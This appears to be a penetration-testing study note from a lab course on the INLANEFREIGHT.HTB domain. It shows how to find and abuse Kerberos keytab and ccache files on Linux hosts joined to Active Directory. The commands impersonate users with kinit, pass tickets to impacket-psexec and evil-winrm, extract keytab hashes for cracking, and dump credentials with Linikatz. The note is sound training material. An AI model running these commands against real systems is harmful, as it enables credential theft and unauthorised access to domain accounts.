In most cases, Linux machines store Kerberos tickets as [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) in the `/tmp` directory. By default, the location of the Kerberos ticket is stored in the environment variable `KRB5CCNAME`. This variable can identify if Kerberos tickets are being used or if the default location for storing Kerberos tickets is changed. These [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) are protected by reading and write permissions, but a user with elevated privileges or root privileges could easily gain access to these tickets.

Another everyday use of Kerberos in Linux is with [keytab](https://kb.iu.edu/d/aumh) files. A [keytab](https://kb.iu.edu/d/aumh) is a file containing pairs of Kerberos principals and encrypted keys (which are derived from the Kerberos password). You can use a keytab file to authenticate to various remote systems using Kerberos without entering a password. However, when you change your password, you must recreate all your keytab files.

### Identifying Linux and Active Directory Integration
```bash
realm list
```

```bash
ps -ef | grep -i "winbind\|sssd"
```

### Hunting Kerberos Tickets
```bash
find / -name *keytab* -ls 2>/dev/null
find / -name *kt* -ls 2>/dev/null
```

> [!NOTE] Note
> To use a keytab file, we must have read and write (rw) privileges on the file.

Keytabs might also be hiding in cronjobs
```bash
~$ crontab -l

# Edit this file to introduce tasks to be run by cron.
# 
<SNIP>
# 
# m h  dom mon dow   command
*5/ * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
```

```bash
~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
#!/bin/bash

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
```

In the above script, we notice the use of [kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html), which means that Kerberos is in use. [kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html) allows interaction with Kerberos, and its function is to request the user's TGT and store this ticket in the cache (ccache file). We can use `kinit` to import a `keytab` into our session and act as the user.

> [!NOTE] Note
> The ticket is represented as a keytab file located by default at `/etc/krb5.keytab` and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account LINUX01$.INLANEFREIGHT.HTB

Locating ccache files
```shell
$ env | grep -i krb5
KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
```

## Abusing KeyTab Files
List KeyTab file information
```bash
klist -k -t /opt/specialfiles/carlos.keytab
```
Impersonate user using a KeyTab (case sensitive)
```bash
klist 
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
klist
```
This will apply to our current shell privilege wise and allow us to access services as carlos
```bash
smbclient //dc01/carlos -k -c ls
```

> [!NOTE] Note
> To keep the ticket from the current session, before importing the keytab, save a copy of the ccache file present in the environment variable KRB5CCNAME
#### Extracting and Cracking KeyTab Hashes
We can attempt to crack the account's password by extracting the hashes from the keytab file. Let's use [KeyTabExtract](https://github.com/sosdave/KeyTabExtract), a tool to extract valuable information from 502-type .keytab files, which may be used to authenticate Linux boxes to Kerberos

```bash
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
```
## Abusing Keytab ccache
To abuse a ccache file, all we need is read privileges on the file. These files, located in `/tmp`, can only be read by the user who created them, but if we gain root access, we could use them.
```bash
id julio@INLANEFREIGHT.HTB
cp /tmp/krb5cc_647401106_I8I133
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
klist
```

```bash
smbclient //dc01/C$ -k -c ls -no-pass
```
## PtT w/ attacking machine

```bash
export KRB5CCNAME=$(pwd)/krb5cc_647401106_I8I133
```

To use the Kerberos ticket, we need to specify our target machine name (not the IP address) and use the option -k. If we get a prompt for a password, we can also include the option -no-pass
```bash
impacket-psexec dc01 -k
```

Evil-WinRM needs the`krb5-user` package. Slap the domain and KDC FQDN in there
```bash
sudo apt-get install krb5-user -y
```

```bash
adot8@htb[/htb]$ cat /etc/krb5.conf

[libdefaults]
        default_realm = INLANEFREIGHT.HTB

<SNIP>

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    } 

<SNIP>
```

```bash
evil-winrm -i dc01 -r inlanefreight.htb
```

### Ticket Convertion
If we want to use a `ccache file` in Windows or a `kirbi file` in a Linux machine, we can use [impacket-ticketConverter](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py) to convert them. To use it, we specify the file we want to convert and the output filename. Let's convert Julio's ccache file to kirbi. 

```shell
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```

The reverse can also be done
```bash
impacket-ticketConverter julio.kirbi krb5cc_julio
```

### Linikatz (root required)
[Linikatz](https://github.com/CiscoCXSecurity/linikatz) will extract all credentials, including Kerberos tickets, from different Kerberos implementations such as FreeIPA, SSSD, Samba, Vintella, etc. Once it extracts the credentials, it places them in a folder whose name starts with `linikatz.`

```bash
./linikatz.sh
```